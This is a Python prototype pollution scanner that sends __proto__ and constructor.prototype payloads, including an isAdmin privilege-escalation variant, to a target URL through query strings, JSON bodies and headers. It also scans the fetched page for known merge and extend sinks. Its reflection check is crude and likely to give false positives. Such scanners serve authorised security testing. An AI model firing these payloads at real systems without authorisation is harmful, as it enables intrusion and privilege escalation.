#!/usr/bin/env python3
"""
Prototype Pollution Scanner — Client-side & Server-side Detection

MITRE ATT&CK Mapping:
  T1059 - Command and Scripting Interpreter (JS prototype manipulation)
  T1190 - Exploit Public-Facing Application (server-side pollution via JSON/query)

Injects __proto__ and constructor.prototype payloads via URL query params, JSON
bodies, and HTTP headers. Detects if the target application propagates the
pollution to its response or behavior.
"""

import argparse
import json
import os
import re
import signal
import sys
import urllib.parse

import requests
from colorama import Fore, Style, init

init(autoreset=True)

SHOULD_EXIT = False
BANNER = f"{Fore.CYAN}Prototype Pollution Scanner v1{Fore.RESET}"

# Prototype pollution payloads for different injection vectors
POLLUTION_PAYLOADS_QUERY = [
    {"__proto__[polluted]": "true"},
    {"__proto__.polluted": "true"},
    {"constructor.prototype.polluted": "true"},
    {"__proto__": {"polluted": "true"}},
]

POLLUTION_PAYLOADS_JSON = [
    {"__proto__": {"polluted": "true"}},
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"__proto__": {"isAdmin": True}},
]

POLLUTION_PAYLOADS_HEADERS = [
    {"X-Polluted": "__proto__[polluted]=true"},
    {"X-Polluted": "constructor.prototype.polluted=true"},
]


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted. Exiting gracefully...{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def test_query_param_pollution(target_url, timeout_sec):
    """Inject prototype pollution payloads via URL query parameters."""
    results = []
    for payload in POLLUTION_PAYLOADS_QUERY:
        if SHOULD_EXIT:
            break
        params = {}
        if isinstance(payload, dict):
            for k, v in payload.items():
                params[k] = json.dumps(v) if not isinstance(v, str) else v
        try:
            resp = requests.get(
                target_url, params=params, timeout=timeout_sec,
                headers={"User-Agent": "Mozilla/5.0"},
            )
            body = resp.text.lower()
            detected = False
            for indicator in ["polluted", "\"true\"", "isadmin"]:
                if indicator in body:
                    detected = True
                    break
            results.append({
                "vector": "query_param",
                "payload": str(payload),
                "status": resp.status_code,
                "length": len(resp.text),
                "pollution_reflected": detected,
            })
        except requests.RequestException as e:
            results.append({
                "vector": "query_param",
                "payload": str(payload),
                "error": str(e),
                "pollution_reflected": False,
            })
    return results


def test_json_body_pollution(target_url, timeout_sec):
    """Inject prototype pollution payloads via JSON POST bodies."""
    results = []
    for payload in POLLUTION_PAYLOADS_JSON:
        if SHOULD_EXIT:
            break
        try:
            resp = requests.post(
                target_url, json=payload, timeout=timeout_sec,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/json",
                },
            )
            body = resp.text.lower()
            detected = False
            for indicator in ["polluted", "\"true\"", "isadmin"]:
                if indicator in body:
                    detected = True
                    break
            results.append({
                "vector": "json_body",
                "payload": json.dumps(payload),
                "status": resp.status_code,
                "length": len(resp.text),
                "pollution_reflected": detected,
            })
        except requests.RequestException as e:
            results.append({
                "vector": "json_body",
                "payload": json.dumps(payload),
                "error": str(e),
                "pollution_reflected": False,
            })
    return results


def test_header_pollution(target_url, timeout_sec):
    """Inject pollution indicators via custom headers."""
    results = []
    for header_set in POLLUTION_PAYLOADS_HEADERS:
        if SHOULD_EXIT:
            break
        try:
            headers = {
                "User-Agent": "Mozilla/5.0",
                **header_set,
            }
            resp = requests.get(target_url, headers=headers, timeout=timeout_sec)
            body = resp.text.lower()
            detected = False
            for indicator in ["polluted", "proto"]:
                if indicator in body:
                    detected = True
                    break
            results.append({
                "vector": "header",
                "payload": str(header_set),
                "status": resp.status_code,
                "length": len(resp.text),
                "pollution_reflected": detected,
            })
        except requests.RequestException as e:
            results.append({
                "vector": "header",
                "payload": str(header_set),
                "error": str(e),
                "pollution_reflected": False,
            })
    return results


def test_client_side_pollution_sinks(html_content):
    """Analyze HTML/JS for known prototype pollution sinks on client side."""
    sinks = []
    patterns = [
        (r"Object\.assign\s*\(", "Object.assign — classic PP sink via merge"),
        (r"\.\.\.\s*\w+\s*\)", "Spread operator — may propagate polluted objects"),
        (r"\$\w*\.extend\s*\(", "jQuery.extend — known PP sink"),
        (r"lodash.*merge\s*\(", "lodash merge — known PP sink"),
        (r"\.merge\s*\(", "Generic merge — potential PP sink"),
        (r"for\s*\(\s*var\s+\w+\s+in\s+", "for-in loop — may iterate polluted properties"),
        (r"JSON\.parse\s*\(", "JSON.parse — may reconstruct polluted objects"),
        (r"URLSearchParams\s*\(", "URLSearchParams — may parse polluted query strings"),
    ]
    for pattern, desc in patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        if matches:
            sinks.append(desc)
    return sinks


def run_scan(target_url, timeout_sec):
    """Run full prototype pollution scan."""
    print(f"\n{Fore.CYAN}[*] Target: {target_url}{Style.RESET_ALL}")

    # Fetch page to analyze client-side code
    try:
        resp = requests.get(target_url, timeout=timeout_sec, headers={
            "User-Agent": "Mozilla/5.0",
        })
        html_content = resp.text
        print(f"{Fore.CYAN}[*] Fetched page: HTTP {resp.status_code} | {len(html_content)} bytes{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}[X] Failed to fetch target: {e}{Style.RESET_ALL}")
        html_content = ""

    print(f"\n  {Fore.CYAN}[1/3] Testing query parameter pollution...{Style.RESET_ALL}")
    query_results = test_query_param_pollution(target_url, timeout_sec)

    print(f"  {Fore.CYAN}[2/3] Testing JSON body pollution...{Style.RESET_ALL}")
    json_results = test_json_body_pollution(target_url, timeout_sec)

    print(f"  {Fore.CYAN}[3/3] Testing header-based pollution...{Style.RESET_ALL}")
    header_results = test_header_pollution(target_url, timeout_sec)

    client_sinks = test_client_side_pollution_sinks(html_content) if html_content else []

    all_results = query_results + json_results + header_results
    reflected = sum(1 for r in all_results if r.get("pollution_reflected"))
    total = len(all_results)

    result = {
        "target": target_url,
        "query_results": query_results,
        "json_results": json_results,
        "header_results": header_results,
        "client_side_sinks": client_sinks,
        "total_tests": total,
        "reflections_detected": reflected,
    }

    print(f"\n  {Fore.CYAN}  Query Param Tests:{Style.RESET_ALL}")
    for r in query_results:
        m = "REFLECTED" if r.get("pollution_reflected") else "CLEAN"
        c = Fore.GREEN if r.get("pollution_reflected") else Fore.RED
        print(f"  [{c}{m:9}{Style.RESET_ALL}] {r['payload'][:60]}")

    print(f"\n  {Fore.CYAN}  JSON Body Tests:{Style.RESET_ALL}")
    for r in json_results:
        m = "REFLECTED" if r.get("pollution_reflected") else "CLEAN"
        c = Fore.GREEN if r.get("pollution_reflected") else Fore.RED
        print(f"  [{c}{m:9}{Style.RESET_ALL}] {r['payload'][:60]}")

    if client_sinks:
        print(f"\n  {Fore.YELLOW}  Client-Side Sinks Detected:{Style.RESET_ALL}")
        for s in client_sinks:
            print(f"    {Fore.YELLOW}[!]{Style.RESET_ALL} {s}")

    return result


def print_report(result):
    """Print final assessment."""
    if not result:
        return
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  PROTOTYPE POLLUTION SCAN REPORT{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"  Target : {result['target']}")
    print(f"  Tests  : {result['total_tests']}")
    print(f"  Reflections : {result['reflections_detected']}")

    if result["reflections_detected"] > 0:
        print(f"\n  {Fore.RED}VERDICT: POLLUTION REFLECTED{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  Payloads reflected. Server-side merging may allow RCE/PE.{Style.RESET_ALL}")
    elif result["client_side_sinks"]:
        print(f"\n  {Fore.YELLOW}VERDICT: CLIENT-SIDE SINKS DETECTED{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  Page contains JS patterns known as prototype pollution sinks.{Style.RESET_ALL}")
    else:
        print(f"\n  {Fore.GREEN}VERDICT: No prototype pollution detected{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="Prototype Pollution Scanner — MITRE T1059, T1190",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python agent.py -u https://target.com/page
  python agent.py -u https://target.com/api/merge -t 15
  python agent.py -u https://target.com/app -o results.json
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout (default: 10)")
    parser.add_argument("-o", "--output", help="Save to JSON")
    args = parser.parse_args()

    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    result = run_scan(args.url, args.timeout)
    print_report(result)
    if args.output and result:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
